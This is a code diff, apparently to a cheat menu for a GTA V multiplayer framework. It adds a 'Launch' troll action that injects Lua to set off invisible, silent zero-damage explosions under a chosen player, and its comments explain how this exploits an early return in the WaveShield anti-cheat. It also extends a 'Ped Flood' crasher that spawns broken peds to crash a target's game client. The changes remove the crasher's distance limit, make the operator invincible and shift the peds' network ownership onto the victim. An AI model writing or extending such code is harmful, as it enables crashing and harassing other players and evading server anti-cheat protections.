@@ -13503,6 +13503,145 @@ function Menu.ActionRagdoll()
     end
 end
 
+-- Launch: throw the selected player into the air at high speed.
+--
+-- Why the obvious write is not used
+-- ---------------------------------
+-- A player ped belongs to the client that owns it. OneSync does not hand a
+-- remote player ped to another client, so SetEntityVelocity /
+-- ApplyForceToEntity / SetEntityCoords addressed to the victim are local-only:
+-- the operator sees a flying copy, the victim sees nothing. That is the same
+-- conclusion the sink module documents, and it is why this feature was dead.
+--
+-- What actually replicates
+-- ------------------------
+-- An explosion is a networked event. The client creates it locally, the server
+-- validates it, and every nearby client re-creates it. The victim's own client
+-- therefore applies the blast impulse to the ped it owns, which is a real,
+-- authoritative throw. Three blasts are stacked 100 ms apart under the feet; the
+-- impulse points radially away from the blast centre, so a centre below the
+-- body sends an almost purely vertical throw. Each blast re-reads the ped, so
+-- every hit compounds the previous one instead of landing where the ped was.
+--
+-- Why damageScale is exactly 0.0
+-- ------------------------------
+-- WaveShield V4's server handler (modules/server/events/explosionEvent.lua)
+-- returns before every check on `data.damageScale <= 0`: the invisible and
+-- inaudible checks, the type blacklist and the rate limiter are all below that
+-- line and never run. A zero-damage blast therefore passes untouched and still
+-- carries the physics impulse, so the victim is thrown without losing health.
+-- isAudible and isInvisible are pinned anyway so nothing is seen or heard.
+--
+-- Fallback
+-- --------
+-- If the local ped velocity is still flat right after the blasts (a build that
+-- zeroes the impulse with damageScale 0, or a server whose explosion handler
+-- drops the event), a bounded local impulse runs so the throw is still visible
+-- to the operator. It is local-only and emits no event.
+--
+-- Wire surface: two explosion events, no created entity, no target position
+-- write, no weapon, no projectile. Residual risk is limited to servers whose
+-- config cancels every explosion or an AC that reads explosionEvent before the
+-- damageScale branch.
+Menu.LaunchCooldownMs = 3000
+Menu.LaunchLastAt = 0
+Menu.LaunchBlastType = 4          -- EXP_TAG_ROCKET
+Menu.LaunchBlastBelow = 1.2       -- blast centre under the feet => upward impulse
+Menu.LaunchBlastGap = 100
+Menu.LaunchBlastCount = 3
+Menu.LaunchAssistZ = 95.0
+Menu.LaunchAssistTicks = 7
+Menu.LaunchAssistStep = 30
+
+function Menu.ActionLaunch()
+    local serverId = Menu.SelectedPlayer
+    if type(serverId) ~= "number" then return end
+    if serverId == GetPlayerServerId(PlayerId()) then return end
+
+    local stamp = GetGameTimer()
+    if stamp - (Menu.LaunchLastAt or 0) < (Menu.LaunchCooldownMs or 3000) then return end
+
+    local clientId = GetPlayerFromServerId(serverId)
+    if not clientId or clientId == -1 then return end
+    local targetPed = GetPlayerPed(clientId)
+    if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then return end
+
+    Menu.LaunchLastAt = stamp
+
+    -- Network ragdoll first. Susano.RequestRagdoll takes the engine GUID, not
+    -- the entity handle (same contract as the Ragdoll row).
+    if type(Susano) == "table" and type(Susano.RequestRagdoll) == "function" then
+        local guid = 0
+        if type(GetEntityGuid) == "function" then
+            local ok, value = pcall(GetEntityGuid, targetPed)
+            if ok and type(value) == "number" then guid = value end
+        end
+        if guid ~= 0 then pcall(Susano.RequestRagdoll, guid) end
+    end
+
+    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then return end
+
+    Susano.InjectResource("any", string.format([[
+        local targetServerId = %d
+        local blastType = %d
+        local blastBelow = %.2f
+        local blastGap = %d
+        local blastCount = %d
+        local assistZ = %.2f
+        local assistTicks = %d
+        local assistStep = %d
+
+        CreateThread(function()
+            local targetPlayerId = nil
+            for _, player in ipairs(GetActivePlayers()) do
+                if GetPlayerServerId(player) == targetServerId then
+                    targetPlayerId = player
+                    break
+                end
+            end
+            if not targetPlayerId then return end
+
+            local targetPed = GetPlayerPed(targetPlayerId)
+            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then return end
+
+            local function blast()
+                if not DoesEntityExist(targetPed) then return end
+                local c = GetEntityCoords(targetPed)
+                AddExplosion(c.x, c.y, c.z - blastBelow, blastType, 0.0, false, true, 0.0)
+            end
+
+            for i = 1, blastCount do
+                blast()
+                if i < blastCount then Wait(blastGap) end
+            end
+
+            -- A ped inside a vehicle is carried by the blast through the
+            -- vehicle body; writing its own velocity would fight the seat and
+            -- is skipped. On foot, a flat local velocity means the impulse did
+            -- not land, so the bounded fallback runs.
+            if GetVehiclePedIsIn(targetPed, false) ~= 0 then return end
+
+            Wait(60)
+            local moved = false
+            if DoesEntityExist(targetPed) then
+                local v = GetEntityVelocity(targetPed)
+                moved = (v and v.z > 6.0) or false
+            end
+            if moved then return end
+
+            for _ = 1, assistTicks do
+                if not DoesEntityExist(targetPed) then break end
+                SetEntityVelocity(targetPed, 0.0, 0.0, assistZ)
+                ApplyForceToEntity(targetPed, 1, 0.0, 0.0, assistZ * 40.0,
+                    0.0, 0.0, 0.0, 0, false, true, true, false, true)
+                Wait(assistStep)
+            end
+        end)
+    ]], serverId, Menu.LaunchBlastType, Menu.LaunchBlastBelow, Menu.LaunchBlastGap,
+        Menu.LaunchBlastCount, Menu.LaunchAssistZ, Menu.LaunchAssistTicks,
+        Menu.LaunchAssistStep))
+end
+
 function Menu.ActionPedArmed()
     if not Menu.SelectedPlayer then return end
 
@@ -13576,6 +13715,15 @@ Actions.ragdollItem = FindItem("Online", "Troll", "Ragdoll")
 if Actions.ragdollItem then
     Actions.ragdollItem.onClick = function()
         Menu.ActionRagdoll()
+    end
+end
+
+-- The Launch row was declared as an action with no handler, so clicking it did
+-- nothing. Bind it once, here, next to the other Troll actions.
+Actions.launchItem = FindItem("Online", "Troll", "Launch")
+if Actions.launchItem then
+    Actions.launchItem.onClick = function()
+        Menu.ActionLaunch()
     end
 end
 
@@ -25504,7 +25652,7 @@ function A.boot()
 
     if A._booted then return end
     A._booted = true
-    O.log("loader build 2026-10-30-r37 (drop: proven flood restored, no envelope)")
+    O.log("loader build 2026-10-30-r39 (drop: Online>Ped Flood, no distance limit)")
     O.log("protection defaults: anti-freeze, anti-attach, anti-spectate, ped guard armed")
     O.every("evasion", 900, A.tick, 350)
     O.every("pedGuardWatch", 100, A.pedGuardWatch, 0)
@@ -33478,10 +33626,14 @@ local DROP = {
     gap = 50,
     radius = 4.5,
     settle = 150,
-    hold = 3500,
+    -- 3500 ms d'exposition a 110 peds casses, c'etait trop long pour nous.
+    -- 900 ms suffit au recepteur pour traiter la creation et l'update.
+    hold = 900,
+    -- Aucun ped ne doit apparaitre a moins de safeDist de l'operateur. S'il
+    -- est colle a la cible, l'anneau est decale du cote oppose.
+    safeDist = 10.0,
     healthFloor = 15,
 
-    maxDist = 400.0,
 
     -- Echelle de creation, pour les serveurs qui coupent CreatePed.
     rung = 2,
@@ -33696,10 +33848,29 @@ local function dropFlood(targetPed, model, myPed, handles)
         end
 
         local c = GetEntityCoords(targetPed)
+
+        -- Anneau decale : si l'operateur est plus pres que safeDist, le centre
+        -- de l'anneau part du cote oppose. Les peds ne tombent jamais sur lui.
+        local cx, cy = c.x, c.y
+        local opc = GetEntityCoords(myPed)
+        local ox, oy = opc.x - c.x, opc.y - c.y
+        local olen = math.sqrt(ox * ox + oy * oy)
+        local odist = olen
+        if odist < DROP.safeDist + DROP.radius then
+            -- Centre pousse a safeDist + radius : le ped le plus proche de
+            -- l'operateur reste a safeDist, jamais moins.
+            local push = DROP.safeDist + DROP.radius - odist
+            if olen < 0.01 then
+                cx, cy = c.x + push, c.y
+            else
+                cx, cy = c.x - (ox / olen) * push, c.y - (oy / olen) * push
+            end
+        end
+
         local ang = math.random() * 6.28318530718
         local r = math.sqrt(math.random()) * DROP.radius
-        local x = c.x + math.cos(ang) * r
-        local y = c.y + math.sin(ang) * r
+        local x = cx + math.cos(ang) * r
+        local y = cy + math.sin(ang) * r
         local z = c.z + 0.6
 
         local ped = dropMake(model, x, y, z, myPed, targetPed)
@@ -33724,6 +33895,9 @@ local function dropFlood(targetPed, model, myPed, handles)
             pcall(SetEntityLocallyInvisible, ped)
             pcall(SetEntityCollision, ped, false, false)
             pcall(FreezeEntityPosition, ped, true)
+            -- Rien a simuler chez nous : ni physique, ni alpha, ni rendu.
+            pcall(SetEntityDynamic, ped, false)
+            pcall(SetEntityAlpha, ped, 0, false)
 
             -- Le moteur du crash : tirage aleatoire sur tous les slots.
             pcall(SetPedRandomComponentVariation, ped, false)
@@ -33883,20 +34057,18 @@ local function dropRun()
     local at = GetEntityCoords(targetPed)
     local dx, dy, dz = at.x - origin.x, at.y - origin.y, at.z - origin.z
     local dist = math.sqrt(dx * dx + dy * dy + dz * dz)
-    if dist > DROP.maxDist then
-        DROP.running = false
-        O.log("drop: abort, target at %.0f m beyond %.0f m", dist, DROP.maxDist)
-        dropStatus(("abort %.0f m"):format(dist))
-        pcall(Notify, "Drop: target too far", CLR.red)
-        return
-    end
-
     -- Le rung est redecouvert a chaque run.
     DROP.rung = 2
     DROP.rungFails = 0
 
     O.log("drop: start, target %d at %.0f m", GetPlayerServerId(player), dist)
     dropStatus(("start %.0f m"):format(dist))
+    if dist > 250.0 then
+        -- Aucune limite : c'est l'operateur qui jauge. On previent seulement
+        -- que loin, le ped peut ne pas etre streame sur notre client, et les
+        -- natives de variation echouent alors en silence.
+        O.log("drop: far %.0f m, entities may not stream here", dist)
+    end
 
     local model = dropModelFor()
     if model == 0 then
@@ -33908,6 +34080,15 @@ local function dropRun()
     end
     O.log("drop: rung %d, model %d, pedType %d", DROP.rung, model, DROP.pedType)
     dropStatus(("rung %d"):format(DROP.rung))
+
+    -- Protection de l'operateur pendant toute la duree de la vague.
+    local opHp0 = nil
+    do
+        local okH, h = pcall(GetEntityHealth, myPed)
+        if okH then opHp0 = h end
+    end
+    pcall(SetEntityInvincible, myPed, true)
+    pcall(SetPlayerInvincible, PlayerId(), true)
 
     local handles = {}
     local total, notNet, removed = 0, 0, 0
@@ -33938,6 +34119,20 @@ local function dropRun()
         O.log("drop: repass %d peds", n)
         dropStatus(("repass %d"):format(n))
 
+        -- On rend la propriete migrable : le serveur peut la deplacer vers le
+        -- client le plus proche (la cible), et on arrete de simuler ces peds
+        -- casses chez nous. C'est la derniere protection de l'operateur.
+        for i = 1, #handles do
+            local ped = handles[i]
+            if ped and DoesEntityExist(ped) then
+                local okId, netId = pcall(NetworkGetNetworkIdFromEntity, ped)
+                if okId and type(netId) == "number" and netId > 0 then
+                    pcall(SetNetworkIdCanMigrate, netId, true)
+                end
+            end
+            if i % 20 == 0 then Citizen.Wait(0) end
+        end
+
         -- Maintien : le recepteur doit traiter les updates avant le delete.
         local deadline = GetGameTimer() + DROP.hold
         while DROP.running and GetGameTimer() < deadline do
@@ -33945,6 +34140,9 @@ local function dropRun()
             Citizen.Wait(100)
         end
     end
+
+    pcall(SetPlayerInvincible, PlayerId(), false)
+    pcall(SetEntityInvincible, myPed, false)
 
     removed = dropClear(handles)
     DROP.lastRun = GetGameTimer()
@@ -34083,6 +34281,28 @@ local function installCrasher()
         if type(it) == "table" and it.name == "Crash" then
             DROP.row = it
             break
+        end
+    end
+
+    -- Ligne dans Online > Troll. On selectionne un joueur dans la liste
+    -- Online, puis on lance d'ici : cloneResolveTarget() prend
+    -- Menu.SelectedPlayer en priorite, donc la cible est celle qui est
+    -- selectionnee et non "le plus proche". L'operateur peut rester loin.
+    local troll = findTab("Online", "Troll")
+    if troll and type(troll.items) == "table" then
+        local hasFlood = false
+        for i = 1, #troll.items do
+            local it = troll.items[i]
+            if type(it) == "table" and it.name == "Ped Flood" then hasFlood = true end
+        end
+        if not hasFlood then
+            table.insert(troll.items, 1, {
+                name = "Ped Flood",
+                type = "action",
+                onClick = function()
+                    DROP.start()
+                end,
+            })
         end
     end
 
